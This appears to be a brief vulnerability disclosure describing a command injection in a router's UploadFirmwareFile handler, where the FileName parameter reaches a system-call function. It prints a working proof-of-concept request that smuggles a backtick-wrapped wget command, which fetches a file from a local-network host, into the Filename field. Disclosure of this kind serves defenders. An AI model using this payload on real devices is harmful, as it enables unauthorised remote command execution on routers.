...
In sub_43363C function, it reads in a user-provided parameter `FileName` .

<div  align="center"><img src="./img/function.png" style="zoom:80%;" /></div>

However ,the value of the `FileName`  is inserted into `v65`  using `snprintf`,and the value of v11 will be handled by the function CsteSystem.
...
We set `FileName` as **\`wget 192.168.6.1:7777/testpoc\`** , and the router will execute it,such as:
...
{"topicurl":"UploadFirmwareFile","Filename":"`wget 192.168.6.1:7777/testpoc`"
